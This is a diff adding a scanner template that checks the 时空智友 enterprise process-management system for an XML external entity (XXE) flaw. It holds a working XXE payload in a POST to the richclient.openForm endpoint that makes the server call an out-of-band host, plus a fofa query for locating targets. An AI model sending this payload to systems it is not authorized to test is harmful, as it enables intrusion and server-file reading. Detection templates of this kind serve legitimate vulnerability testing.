@@ -1,0 +1,36 @@
+id: shikongzhiyou-richclient.openform-xxe
+
+info:
+  name: 时空智友企业流程化管控系统 XML 外部实体注入漏洞
+  author: AVIC123
+  severity: high
+  verified: true
+  description: |
+    时空智友企业流程化管控系统是一款企业信息管理软件，主要用于优化企业内部流程。然而，该系统可能存在 XML外部实体注入（XXE）漏洞，攻击者可以利用此漏洞读取服务器文件或执行恶意操作
+    fofa: ody="login.jsp?login=null"
+  reference:
+    - https://blog.csdn.net/weixin_43981050/article/details/132984582
+  tags: shikongzhiyou,xxe
+  created: 2025/08/25
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /formservice?service=richclient.openForm
+      headers:
+        Content-Type: application/xml
+      body: |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{oobHTTP}}">]>
+        <request>
+        <data>&xxe;</data>
+        </request>
+    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
+
+expression: r0()
